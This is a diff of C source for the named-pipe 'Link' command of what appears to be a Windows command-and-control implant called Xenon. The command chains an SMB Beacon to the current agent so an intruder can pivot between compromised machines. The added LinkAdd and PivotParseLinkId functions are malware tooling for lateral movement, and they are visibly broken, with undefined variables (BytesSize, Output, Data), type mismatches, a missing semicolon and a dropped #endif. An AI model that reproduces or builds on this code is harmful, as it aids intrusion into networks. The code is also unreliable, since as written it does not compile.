@@ -1,166 +1,12 @@
 #include "Tasks/Link.h"
 
+#include "Xenon.h"
 #include "Package.h"
 #include "Parser.h"
 #include "Task.h"
 #include "Config.h"
 
 #ifdef INCLUDE_CMD_LINK
-
-/**
- * @brief Connect to named pipe server and read data (local or remote).
- * 
- * @ref 
- * @return BOOL
- */
-BOOL LinkAdd(_In_ char* NamedPipe, _Out_ PVOID* OutBuffer, _Out_ SIZE_T* OutLen)
-{
-    if (!NamedPipe) {
-        _err("Invalid arguments");
-        return FALSE;
-    }
-
-    DWORD error = 0;
-    HANDLE handle = CreateFileA(
-        NamedPipe,
-        GENERIC_READ | GENERIC_WRITE,
-        0,              // no sharing
-        NULL,
-        OPEN_EXISTING,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL
-    );
-
-    if (handle == INVALID_HANDLE_VALUE) {
-        error = GetLastError();
-        _err("CreateFileA failed: %d", lastErr);
-
-        if (error == ERROR_PIPE_BUSY) {
-            /* wait up to ~6500 ms like original snippet, then try once */
-            if (!WaitNamedPipeA(NamedPipe, 6500)) {
-                _err("WaitNamedPipeA timed out / failed: %d", GetLastError());
-                return FALSE;
-            }
-
-            /* try again */
-            handle = CreateFileA(
-                NamedPipe,
-                GENERIC_READ | GENERIC_WRITE,
-                0,
-                NULL,
-                OPEN_EXISTING,
-                FILE_ATTRIBUTE_NORMAL,
-                NULL
-            );
-
-            if (handle == INVALID_HANDLE_VALUE) {
-                _err("CreateFileA retry failed: %d", GetLastError());
-                return FALSE;
-            }
-        } else {
-            return FALSE;
-        }
-    }
-
-    /* At this point we have a valid pipe handle */
-    BOOL ok = FALSE;
-    DWORD available = 0;
-    PBYTE buffer = NULL;
-    DWORD bytesRead = 0;
-
-    /* Peek until we see available bytes (mirrors original loop) */
-    while (1) {
-        if (PeekNamedPipe(handle, NULL, 0, NULL, &available, NULL)) {
-            if (!available) {
-                _err("no data available from named pipe");
-                CloseHandle(handle);
-                return FALSE;
-            }
-
-            _err("%d bytes available from named pipe", available);
-
-            buffer = (BYTE*)malloc(available);
-            if (!buffer) {
-                _err("malloc failed for %d bytes", available);
-                CloseHandle(handle);
-                return FALSE;
-            }
-
-            if (ReadFile(handle, buffer, available, &bytesRead, NULL)) {
-                _dbg("Read pipe buffer with success: %d", bytesRead);
-                break;
-            } else {
-                DWORD readErr = GetLastError();
-                _err("failed to read pipe buffer: %d", readErr);
-                free(buffer);
-                CloseHandle(handle);
-                return FALSE;
-            }
-        } else {
-            DWORD peekErr = GetLastError();
-            _err("PeekNamedPipe failed: %d", peekErr);
-            /* original code kept looping — but to avoid tight spin, return NULL */
-            CloseHandle(handle);
-            return FALSE;
-        }
-    }
-
-    /* Expect the UUID to be at least 36 bytes (UUID string) */
-    if (bytesRead < 36) {
-        _err("Buffer too small for uuid: %d", bytesRead);
-        free(buffer);
-        CloseHandle(handle);
-        return FALSE;
-    }
-
-    // char *tmpUUID = (char*)malloc(36 + 1);
-    // if (!tmpUUID) {
-    //     _err("malloc failed for tmpUUID");
-    //     free(buffer);
-    //     CloseHandle(handle);
-    //     return NULL;
-    // }
-    // memcpy(tmpUUID, buffer, 36);
-    // tmpUUID[36] = '\0';
-
-    // _dbg("parsed uuid: %s", tmpUUID);
-
-    // SMB_PROFILE_DATA *smb = (SMB_PROFILE_DATA*)malloc(sizeof(SMB_PROFILE_DATA));
-    // if (!smb) {
-    //     _err("malloc failed for SMB_PROFILE_DATA");
-    //     free(tmpUUID);
-    //     free(buffer);
-    //     CloseHandle(handle);
-    //     return NULL;
-    // }
-
-    /* populate */
-    // smb->Handle      = handle;
-    // smb->Pkg         = Package;
-    // smb->Psr         = Parser;
-    // smb->Pkg->Buffer = buffer;
-    // smb->Pkg->Length = (uint32_t)bytesRead;
-    // smb->SmbUUID     = tmpUUID;
-    // smb->AgentUUID   = tmpUUID;   /* original code copied same pointer for both */
-    // smb->Next        = NULL;
-
-    /* Output variables */
-    *OutBuffer = buffer;
-    *OutLen    = &bytesRead;
-
-    /* append to global list (non-thread-safe) */
-    // if (!g_pipe_head) {
-    //     g_pipe_head = smb;
-    // } else {
-    //     SMB_PROFILE_DATA *cur = g_pipe_head;
-    //     while (cur->Next) cur = cur->Next;
-    //     cur->Next = smb;
-    // }
-
-    return TRUE;
-}
-
-
 
 /**
  * @brief Link current Beacon to an SMB Beacon.
@@ -188,19 +34,24 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
     PVOID outBuf  = NULL;
     SIZE_T outLen = 0;
 
-    if ( !LinkAdd(NamedPipe, &outBuf, &outLen) ) 
+    if ( !LinkAdd(Target, PipeName, &outBuf, &outLen) ) 
     {
         _err("Failed to link smb agent.");
     }
 
+    // Response package
+    PPackage data = PackageInit(0, FALSE);
+    PackageAddString(data, outBuf, FALSE);
+
+    // success
+    PackageComplete(taskUuid, NULL);
+
+end:
+
     return;
 }
 
-#endif  //INCLUDE_CMD_LINK
-
 ///////////////////////////////////////////////////////////////
-
-#ifdef INCLUDE_CMD_UNLINK
 
 /**
  * @brief UnLink current Beacon from an SMB Beacon.
@@ -213,4 +64,127 @@ VOID UnLink(PCHAR taskUuid, PPARSER arguments)
     return;
 }
 
-#endif  //INCLUDE_CMD_UNLINK
+
+///////////////////////////////////////////////////////////////////
+////////////////        Helper Commands         ///////////////////
+///////////////////////////////////////////////////////////////////
+
+BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
+{
+    PLINKS LinkData    = NULL;
+    HANDLE hPipe       = NULL;
+
+    _dbg( "Connecting to named pipe: %s\n", PipeName );
+
+    hPipe = CreateFileA( PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
+
+    if ( hPipe == INVALID_HANDLE_VALUE )
+    {
+        _dbg( "CreateFileA: Failed[%d]\n", GetLastError() );
+        return FALSE;
+    }
+
+    if ( GetLastError() == ERROR_PIPE_BUSY )
+    {
+        if ( !WaitNamedPipeA(PipeName, 5000) )
+        {
+            return FALSE;
+        }
+    }
+
+    do
+    {
+        // TODO: first get the size then parse
+        if ( PeekNamedPipe( hPipe, NULL, 0, NULL, outLen, NULL ) )
+        {
+            if ( *BytesSize > 0 )
+            {
+                _dbg( "BytesSize => %d\n", *BytesSize );
+
+                *Output = LocalAlloc(LPTR, *BytesSize);
+                memset(*Output, 0, *BytesSize);
+
+                if ( ReadFile( hPipe, *Output, *BytesSize, BytesSize, NULL ) )
+                {
+                    _dbg( "BytesSize Read => %d\n", *BytesSize );
+                    break;
+                }
+                else
+                {
+                    _dbg( "ReadFile: Failed[%d]\n", GetLastError() );
+                    CloseHandle(hPipe);
+                    return FALSE;
+                }
+            }
+        }
+        else
+        {
+            _dbg( "PeekNamedPipe: Failed[%d]\n", GetLastError() );
+            CloseHandle(hPipe);
+            return FALSE;
+        }
+    } while ( TRUE );
+
+    // Adding Link Data to the list
+    {
+        _dbg( "Pivot :: Output[%p] Size[%d]\n", *Output, *BytesSize )
+
+        PCHAR NewLinkId = NULL;
+        PivotParseLinkId(*Output, *BytesSize, *NewLinkId);
+
+        LinkData                  = LocalAlloc(LPTR, sizeof(PLINKS));
+        LinkData->hPipe           = hPipe;
+        LinkData->next            = NULL;
+        LinkData->LinkId          = NewLinkId;
+        LinkData->PipeName        = LocalAlloc( LPTR, strlen(PipeName));        // TODO - Check this feels sketchy strings
+        memcpy( LinkData->PipeName, PipeName, strlen(PipeName) );
+
+        if ( ! xenonConfig->SmbLinks )
+        {
+            xenonConfig->SmbLinks = LinkData;
+        }
+        else
+        {
+            PLINKS LinksList = xenonConfig->SmbLinks;
+
+            do
+            {
+                if ( LinksList )
+                {
+                    if ( LinksList->Next )
+                        LinksList = LinksList->Next;
+
+                    else
+                    {
+                        LinksList->Next = Data;
+                        break;
+                    }
+                }
+                else break;
+            } while ( TRUE );
+        }
+    }
+
+    return TRUE;
+}
+
+VOID PivotParseLinkId( PVOID buffer, SIZE_T size, PCHAR* LinkId )
+{
+    PARSER Parser  = { 0 };
+    UINT32 Value   = 0;
+    SIZE_T uuidLen = 0;
+
+    ParserNew( &Parser, buffer, size );
+
+    PCHAR Value  = ParserStringCopy(&Parser, &uuidLen);
+
+    _dbg("Parsed SMB Link ID => %s \n", Value);
+
+    ParserDestroy(&Parser);
+
+    *LinkId = Value;
+}
+
+
+
+#endif  //INCLUDE_CMD_LINK
